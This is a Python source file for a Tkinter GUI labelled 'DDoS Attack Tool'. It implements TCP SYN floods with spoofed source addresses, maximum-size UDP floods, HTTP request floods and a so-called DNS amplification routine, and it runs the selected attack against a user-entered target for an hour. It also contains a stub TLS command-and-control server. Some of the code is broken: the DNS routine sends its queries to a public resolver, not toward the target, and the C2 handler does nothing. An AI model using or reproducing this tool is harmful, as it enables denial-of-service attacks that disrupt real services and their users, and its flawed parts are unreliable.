import socket
import ssl
import json
import random
import time
import urllib.request
import base64
import multiprocessing 
import subprocess
import os
import tkinter as tk
from tkinter import ttk, messagebox

# DDoS Attack Capabilities
def tcp_syn_flood(target_ip, target_port, duration, status_label):
    if os.geteuid() != 0:
        status_label.config(text="TCP SYN flood requires root privileges")
        return
        
    start_time = time.time()
    packets_sent = 0
    while time.time() - start_time < duration:
        try:
            for _ in range(100): # Send multiple packets per iteration
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                source_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                s.sendto(b'\x45\x00\x00\x3c\x00\x01\x00\x00\x40\x06\x7c\x44' + 
                         socket.inet_aton(source_ip) + socket.inet_aton(target_ip) +b'\x00\x50' + target_port.to_bytes(2, 'big') + b'\x00\x00\x00\x00\xa0\x02\xfa\xf0\x78\x5a\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\x50\x3a\x3b\x00\x00\x00\x00\x01\x03\x03\x07', (target_ip, 0))
                s.close()
                packets_sent += 1
                status_label.config(text=f"TCP SYN Flood: {packets_sent} packets sent")
        except:
            continue

def udp_flood(target_ip, target_port, duration, status_label):
    start_time = time.time()
    packets_sent = 0
    while time.time() - start_time < duration:
        try:
            for _ in range(100): # Send multiple packets per iteration
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b'\x00' * 65507, (target_ip, target_port)) # Maximum UDP packet size
                s.close()
                packets_sent += 1
                status_label.config(text=f"UDP Flood: {packets_sent} packets sent")
        except:
            continue

def http_flood(target_url, duration, status_label):
    start_time = time.time()
    requests_sent = 0
    while time.time() - start_time < duration:
        try:
            for _ in range(50): # Multiple requests per iteration
                urllib.request.urlopen(target_url, timeout=1)
                requests_sent += 1
                status_label.config(text=f"HTTP Flood: {requests_sent} requests sent")
        except:
            continue

def dns_amplification(target_ip, duration, status_label):
    start_time = time.time()
    queries_sent = 0
    while time.time() - start_time < duration:
        try:
            for _ in range(100): # Multiple queries per iteration
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Larger DNS query for more amplification
                s.sendto(b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01' * 10, ('8.8.8.8', 53))
                s.close()
                queries_sent += 1
                status_label.config(text=f"DNS Amplification: {queries_sent} queries sent")
        except:
            continue

def launch_ddos(target, attack_type, port, status_label):
    # Launch multiple processes for each attack type
    processes = []
    duration = 3600 # Attack for 1 hour
    
    if attack_type == "tcp_syn":
        p = multiprocessing.Process(target=tcp_syn_flood, args=(target, port, duration, status_label))
        processes.append(p)
        p.start()
    elif attack_type == "udp":
        p = multiprocessing.Process(target=udp_flood, args=(target, port, duration, status_label))
        processes.append(p)
        p.start()
    elif attack_type == "http":
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        p = multiprocessing.Process(target=http_flood, args=(target, duration, status_label))
        processes.append(p)
        p.start()
    elif attack_type == "dns":
        p = multiprocessing.Process(target=dns_amplification, args=(target, duration, status_label))
        processes.append(p)
        p.start()
    
    # Wait for all processes to complete
    for p in processes:
        p.join()

class DDoSGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DDoS Attack Tool")
        self.root.geometry("400x400")
        
        # Target input frame
        self.target_frame = ttk.LabelFrame(self.root, text="Target Information")
        self.target_frame.pack(padx=10, pady=5, fill="x")
        
        # IP Address
        tk.Label(self.target_frame, text="Target IP/Website:").pack(pady=5)
        self.ip_entry = tk.Entry(self.target_frame, width=40)
        self.ip_entry.pack(pady=5)
        
        # Port
        tk.Label(self.target_frame, text="Port:").pack(pady=5)
        self.port_entry = tk.Entry(self.target_frame)
        self.port_entry.insert(0, "80")
        self.port_entry.pack(pady=5)
        
        # Attack Type
        tk.Label(self.target_frame, text="Attack Type:").pack(pady=5)
        self.attack_type = ttk.Combobox(self.target_frame, values=["tcp_syn", "udp", "http", "dns"])
        self.attack_type.set("http")
        self.attack_type.pack(pady=5)
        
        # Status Label
        self.status_label = tk.Label(self.root, text="Ready to attack...")
        self.status_label.pack(pady=10)
        
        # Start Button
        tk.Button(self.root, text="Start Attack", command=self.start_attack).pack(pady=20)
        
    def start_attack(self):
        target = self.ip_entry.get()
        port = int(self.port_entry.get())
        attack = self.attack_type.get()
        
        if not target:
            messagebox.showerror("Error", "Please enter target IP or website")
            return
            
        launch_ddos(target, attack, port, self.status_label)

def start_c2_server():
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    try:
        context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    except FileNotFoundError:
        print("Error: SSL certificate files not found")
        return
    except ssl.SSLError as e:
        print(f"SSL Error: {e}")
        return
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(s, server_side=True)
    try:
        s.bind(('0.0.0.0', 8443))
        s.listen(5)
        print("C2 server started on port 8443")
        
        while True:
            try:
                client, addr = s.accept()
                print(f"Connection from {addr}")
                # Handle C2 commands here
                client.close()
            except Exception as e:
                print(f"Error handling client: {e}")
                continue
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        s.close()

# Main Execution
if __name__ == "__main__":
    gui = DDoSGUI()
    gui.root.mainloop()
